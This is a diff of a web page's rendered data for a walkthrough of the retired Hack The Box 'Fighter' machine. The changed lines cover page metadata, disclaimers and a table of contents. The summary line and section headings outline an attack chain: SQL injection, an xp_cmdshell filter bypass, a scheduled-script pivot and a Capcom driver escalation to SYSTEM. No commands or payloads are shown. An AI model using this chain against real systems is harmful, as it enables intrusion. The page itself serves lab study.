@@ -4,8 +4,8 @@
 4:I[8500,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],""]
 5:I[7549,["500","static/chunks/500-c99b8dfd3de17c86.js","851","static/chunks/app/writing/%5Bslug%5D/page-62c612da01ccb422.js"],"MobileNavigation"]
 12:I[7123,[],"default",1]
-:HL["/_next/static/css/2377371a6300f138.css","style"]
-0:{"P":null,"c":["","writing","hackthebox-fighter-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-fighter-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/2377371a6300f138.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"zs2c_HJI2CXWwLDIPVraL"}
+:HL["/_next/static/css/8149d5cedd00bf59.css","style"]
+0:{"P":null,"c":["","writing","hackthebox-fighter-walkthrough",""],"q":"","i":false,"f":[[["",{"children":["writing",{"children":[["slug","hackthebox-fighter-walkthrough","d",null],{"children":["__PAGE__",{}]}]}]},"$undefined","$undefined",16],[["$","$1","c",{"children":[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/8149d5cedd00bf59.css","precedence":"next","crossOrigin":"$undefined","nonce":"$undefined"}]],["$","html",null,{"lang":"en","children":[["$","head",null,{"children":["$","link",null,{"rel":"alternate","type":"application/rss+xml","href":"/feed.xml","title":"CyberKareem security writing"}]}],["$","body",null,{"children":[["$","$L2",null,{"parallelRouterKey":"children","error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L3",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"$undefined","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"$undefined"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"subpage-main","children":["$","section",null,{"className":"page-hero shell","aria-labelledby":"not-found-title","children":[["$","p",null,{"className":"page-eyebrow","children":"Error record · 404"}],["$","h1",null,{"id":"not-found-title","children":["This page has left the ",["$","em",null,{"children":"record."}]]}],["$","div",null,{"className":"page-intro-grid","children":[["$","div",null,{"className":"page-intro-copy","children":[["$","p",null,{"children":"The address may have changed, or the page may no longer be public. The research ledger and owned writing archive remain available from their permanent indexes."}],["$","div",null,{"className":"page-actions","children":[["$","$L4",null,{"className":"button button-primary","href":"/","children":["Return home ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L4",null,{"className":"button button-secondary","href":"/writing","children":"Browse the writing archive"}]]}]]}],["$","div",null,{"className":"contact-guardrail","role":"note","children":[["$","span",null,{"children":"Looking for evidence?"}],["$","p",null,{"children":"Open the public research ledger for current advisory and CVE records linked to their primary sources."}],["$","$L4",null,{"className":"text-link","href":"/research","children":["Open research ledger ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}]]}]]}]]}]}],["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L4",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L4","Research",{"href":"/research","children":"Research"}],["$","$L4","Services",{"href":"/services","children":"Services"}],["$","$L4","Writing",{"href":"/writing","children":"Writing"}],["$","$L4","Projects",{"href":"/projects","children":"Projects"}],["$","$L4","About",{"href":"/about","children":"About"}],["$","$L4","Contact",{"href":"/contact","children":"Contact"}],["$","$L4","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":["$L6","$L7","$L8","$L9","$La"]}]]}]]}],"$Lb"]}]],[]],"forbidden":"$undefined","unauthorized":"$undefined"}],"$Lc"]}]]}]]}],{"children":["$Ld",{"children":["$Le",{"children":["$Lf",{},null,false,null]},null,false,"$@10"]},null,false,"$@10"]},null,false,null],"$L11",false]],"m":"$undefined","G":["$12",[]],"S":true,"h":null,"s":"$undefined","l":"$undefined","p":"$undefined","d":"$undefined","b":"EBRi0HxexS1XMGpfUl_9d"}
 15:I[484,[],"OutletBoundary"]
 16:"$Sreact.suspense"
 19:I[484,[],"ViewportBoundary"]
@@ -24,7 +24,7 @@ f:["$","$1","c",{"children":["$L14",null,["$","$L15",null,{"children":["$","$16"
 10:"$W18"
 11:["$","$1","h",{"children":[null,["$","$L19",null,{"children":"$L1a"}],["$","div",null,{"hidden":true,"children":["$","$L1b",null,{"children":["$","$16",null,{"name":"Next.Metadata","children":"$L1c"}]}]}],null]}]
 :HL["/writing/covers/hackthebox-fighter-walkthrough.webp","image"]
-14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Fighter Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box Fighter machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:14:00.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[18," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-fighter-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Fighter machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Fighter machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/fighter","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","the-hacker-mindset-approach",{"children":["$","a",null,{"href":"#the-hacker-mindset-approach","children":"The Hacker Mindset: Approach"}]}],["$","li","step-1-network-reconnaissance",{"children":["$","a",null,{"href":"#step-1-network-reconnaissance","children":"Step 1: Network Reconnaissance"}]}],["$","li","step-2-web-enumeration-and-subdomain-discovery",{"children":["$","a",null,{"href":"#step-2-web-enumeration-and-subdomain-discovery","children":"Step 2: Web Enumeration & Subdomain Discovery"}]}],["$","li","step-3-finding-the-login-page",{"children":["$","a",null,{"href":"#step-3-finding-the-login-page","children":"Step 3: Finding the Login Page"}]}],["$","li","step-4-discovering-sql-injection",{"children":["$","a",null,{"href":"#step-4-discovering-sql-injection","children":"Step 4: Discovering SQL Injection"}]}],["$","li","step-5-exploiting-sql-injection-with-stacked-queries",{"children":"$L1d"}],"$L1e","$L1f","$L20","$L21","$L22","$L23","$L24","$L25","$L26"]}]]}],"$L27"],"$L28","$L29",["$L2a","$L2b","$L2c"]]}],"$L2d"]}]]}],"$L2e"]}],"$L2f","$L30"]
+14:[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L4",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","$L4","/research",{"href":"/research","aria-current":"$undefined","children":"Research"}],["$","$L4","/services",{"href":"/services","aria-current":"$undefined","children":"Services"}],["$","$L4","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","$L4","/projects",{"href":"/projects","aria-current":"$undefined","children":"Projects"}],["$","$L4","/about",{"href":"/about","aria-current":"$undefined","children":"About"}],["$","$L4","/contact",{"href":"/contact","aria-current":"$undefined","children":"Contact"}]]}],["$","$L4",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an assessment ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L5",null,{"items":["$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:0","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:1","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:2","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:3","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:4","$0:f:0:1:0:props:children:1:props:children:1:props:children:0:props:notFound:0:0:1:props:children:props:children:3:props:items:5"],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L4",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: Fighter Walkthrough"}],["$","p",null,{"className":"article-dek","children":"Stacked SQL injection and a database command-execution filter bypass provide a service-account shell, a writable scheduled script pivots to another user, and a vulnerable Capcom driver grants SYSTEM access."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:14:00.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[17," minutes"]}]]}],null,["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-fighter-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box Fighter machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official Fighter machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://app.hackthebox.com/machines/fighter","target":"_blank","rel":"nofollow noopener noreferrer","children":"Hack The Box machine artwork"}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[[["$","nav",null,{"className":"article-toc article-toc-desktop","aria-label":"Article sections","children":[["$","span",null,{"children":"On this page"}],["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-network-reconnaissance",{"children":["$","a",null,{"href":"#step-1-network-reconnaissance","children":"Step 1: Network Reconnaissance"}]}],["$","li","step-2-web-enumeration-and-subdomain-discovery",{"children":["$","a",null,{"href":"#step-2-web-enumeration-and-subdomain-discovery","children":"Step 2: Web Enumeration & Subdomain Discovery"}]}],["$","li","step-3-finding-the-login-page",{"children":["$","a",null,{"href":"#step-3-finding-the-login-page","children":"Step 3: Finding the Login Page"}]}],["$","li","step-4-discovering-sql-injection",{"children":["$","a",null,{"href":"#step-4-discovering-sql-injection","children":"Step 4: Discovering SQL Injection"}]}],["$","li","step-5-exploiting-sql-injection-with-stacked-queries",{"children":"$L1d"}],"$L1e","$L1f","$L20","$L21","$L22","$L23","$L24","$L25","$L26"]}]]}],"$L27"],"$L28","$L29",["$L2a","$L2b","$L2c"]]}],"$L2d"]}]]}],"$L2e"]}],"$L2f","$L30"]
 1d:["$","a",null,{"href":"#step-5-exploiting-sql-injection-with-stacked-queries","children":"Step 5: Exploiting SQL Injection with Stacked Queries"}]
 1e:["$","li","step-6-waf-bypass-and-xp-cmdshell",{"children":["$","a",null,{"href":"#step-6-waf-bypass-and-xp-cmdshell","children":"Step 6: WAF Bypass & xp_cmdshell"}]}]
 1f:["$","li","step-7-getting-a-shell-as-sqlserv",{"children":["$","a",null,{"href":"#step-7-getting-a-shell-as-sqlserv","children":"Step 7: Getting a Shell as sqlserv"}]}]
@@ -35,41 +35,40 @@ f:["$","$1","c",{"children":["$L14",null,["$","$L15",null,{"children":["$","$16"
 24:["$","li","alternative-paths",{"children":["$","a",null,{"href":"#alternative-paths","children":"Alternative Paths"}]}]
 25:["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}]
 26:["$","li","final-flags",{"children":["$","a",null,{"href":"#final-flags","children":"Final Flags"}]}]
-27:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page · ",15," sections"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","the-hacker-mindset-approach",{"children":["$","a",null,{"href":"#the-hacker-mindset-approach","children":"The Hacker Mindset: Approach"}]}],["$","li","step-1-network-reconnaissance",{"children":["$","a",null,{"href":"#step-1-network-reconnaissance","children":"Step 1: Network Reconnaissance"}]}],["$","li","step-2-web-enumeration-and-subdomain-discovery",{"children":["$","a",null,{"href":"#step-2-web-enumeration-and-subdomain-discovery","children":"Step 2: Web Enumeration & Subdomain Discovery"}]}],["$","li","step-3-finding-the-login-page",{"children":["$","a",null,{"href":"#step-3-finding-the-login-page","children":"Step 3: Finding the Login Page"}]}],["$","li","step-4-discovering-sql-injection",{"children":["$","a",null,{"href":"#step-4-discovering-sql-injection","children":"Step 4: Discovering SQL Injection"}]}],["$","li","step-5-exploiting-sql-injection-with-stacked-queries",{"children":["$","a",null,{"href":"#step-5-exploiting-sql-injection-with-stacked-queries","children":"Step 5: Exploiting SQL Injection with Stacked Queries"}]}],["$","li","step-6-waf-bypass-and-xp-cmdshell",{"children":["$","a",null,{"href":"#step-6-waf-bypass-and-xp-cmdshell","children":"Step 6: WAF Bypass & xp_cmdshell"}]}],["$","li","step-7-getting-a-shell-as-sqlserv",{"children":["$","a",null,{"href":"#step-7-getting-a-shell-as-sqlserv","children":"Step 7: Getting a Shell as sqlserv"}]}],["$","li","step-8-privilege-escalation-to-decoder",{"children":["$","a",null,{"href":"#step-8-privilege-escalation-to-decoder","children":"Step 8: Privilege Escalation to decoder"}]}],["$","li","step-9-getting-the-user-flag",{"children":["$","a",null,{"href":"#step-9-getting-the-user-flag","children":"Step 9: Getting the User Flag"}]}],["$","li","step-10-privilege-escalation-to-system",{"children":["$","a",null,{"href":"#step-10-privilege-escalation-to-system","children":"Step 10: Privilege Escalation to SYSTEM"}]}],["$","li","step-11-getting-the-root-flag",{"children":["$","a",null,{"href":"#step-11-getting-the-root-flag","children":"Step 11: Getting the Root Flag"}]}],["$","li","alternative-paths",{"children":["$","a",null,{"href":"#alternative-paths","children":"Alternative Paths"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}],["$","li","final-flags",{"children":["$","a",null,{"href":"#final-flags","children":"Final Flags"}]}]]}]}]]}]
-28:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/106f8c978eea4b5833db7c4587ca2e1678f3f5a1/HTB-Fighter.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep"," · 106f8c978eea",""]}]]]}]
-29:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Fighter"," · Windows"," · Insane"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/fighter","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]
+27:["$","details",null,{"className":"article-toc article-toc-mobile","children":[["$","summary",null,{"children":["On this page (",15," sections)"]}],["$","nav",null,{"aria-label":"Article sections","children":["$","ol",null,{"children":[["$","li","attack-chain",{"children":["$","a",null,{"href":"#attack-chain","children":"Attack chain"}]}],["$","li","step-1-network-reconnaissance",{"children":["$","a",null,{"href":"#step-1-network-reconnaissance","children":"Step 1: Network Reconnaissance"}]}],["$","li","step-2-web-enumeration-and-subdomain-discovery",{"children":["$","a",null,{"href":"#step-2-web-enumeration-and-subdomain-discovery","children":"Step 2: Web Enumeration & Subdomain Discovery"}]}],["$","li","step-3-finding-the-login-page",{"children":["$","a",null,{"href":"#step-3-finding-the-login-page","children":"Step 3: Finding the Login Page"}]}],["$","li","step-4-discovering-sql-injection",{"children":["$","a",null,{"href":"#step-4-discovering-sql-injection","children":"Step 4: Discovering SQL Injection"}]}],["$","li","step-5-exploiting-sql-injection-with-stacked-queries",{"children":["$","a",null,{"href":"#step-5-exploiting-sql-injection-with-stacked-queries","children":"Step 5: Exploiting SQL Injection with Stacked Queries"}]}],["$","li","step-6-waf-bypass-and-xp-cmdshell",{"children":["$","a",null,{"href":"#step-6-waf-bypass-and-xp-cmdshell","children":"Step 6: WAF Bypass & xp_cmdshell"}]}],["$","li","step-7-getting-a-shell-as-sqlserv",{"children":["$","a",null,{"href":"#step-7-getting-a-shell-as-sqlserv","children":"Step 7: Getting a Shell as sqlserv"}]}],["$","li","step-8-privilege-escalation-to-decoder",{"children":["$","a",null,{"href":"#step-8-privilege-escalation-to-decoder","children":"Step 8: Privilege Escalation to decoder"}]}],["$","li","step-9-getting-the-user-flag",{"children":["$","a",null,{"href":"#step-9-getting-the-user-flag","children":"Step 9: Getting the User Flag"}]}],["$","li","step-10-privilege-escalation-to-system",{"children":["$","a",null,{"href":"#step-10-privilege-escalation-to-system","children":"Step 10: Privilege Escalation to SYSTEM"}]}],["$","li","step-11-getting-the-root-flag",{"children":["$","a",null,{"href":"#step-11-getting-the-root-flag","children":"Step 11: Getting the Root Flag"}]}],["$","li","alternative-paths",{"children":["$","a",null,{"href":"#alternative-paths","children":"Alternative Paths"}]}],["$","li","key-lessons-and-takeaways",{"children":["$","a",null,{"href":"#key-lessons-and-takeaways","children":"Key Lessons & Takeaways"}]}],["$","li","final-flags",{"children":["$","a",null,{"href":"#final-flags","children":"Final Flags"}]}]]}]}]]}]
+28:["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/106f8c978eea4b5833db7c4587ca2e1678f3f5a1/HTB-Fighter.md","target":"_blank","rel":"nofollow noopener noreferrer","children":"Immutable source revision"}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 106f8c978eea",""]}]]]}]
+29:["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Fighter, Windows, Insane",". Retired status verified ","12 Jul 2026","."]}],["$","a",null,{"href":"https://app.hackthebox.com/machines/fighter","target":"_blank","rel":"nofollow noopener noreferrer","children":"Open Hack The Box profile"}]]}]
 2a:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box Fighter machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
-2b:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
-2c:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"11 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
-31:T9020,
-<blockquote>
-<p><strong>Target:</strong> 10.129.228.121<br /><strong>OS:</strong> Windows Server 2012 R2<br /><strong>Difficulty:</strong> Insane<br /><strong>Flags:</strong></p>
+2b:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported from Abdullah Kareem's public preparation notes and lightly copy-edited for clarity. Commands and technical claims remain tied to the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+2c:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"8 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+31:T8ba3,<blockquote>
+<p><strong>Target:</strong> 10.129.228.121<br><strong>OS:</strong> Windows Server 2012 R2<br><strong>Difficulty:</strong> Insane<br><strong>Flags:</strong></p>
 <ul>
 <li>User: <code>bb6163[redacted]35934297</code></li>
 <li>Root: <code>d801c[redacted]3be314c1</code></li>
 </ul>
 </blockquote>
-<hr />
+<hr>
 
 
 
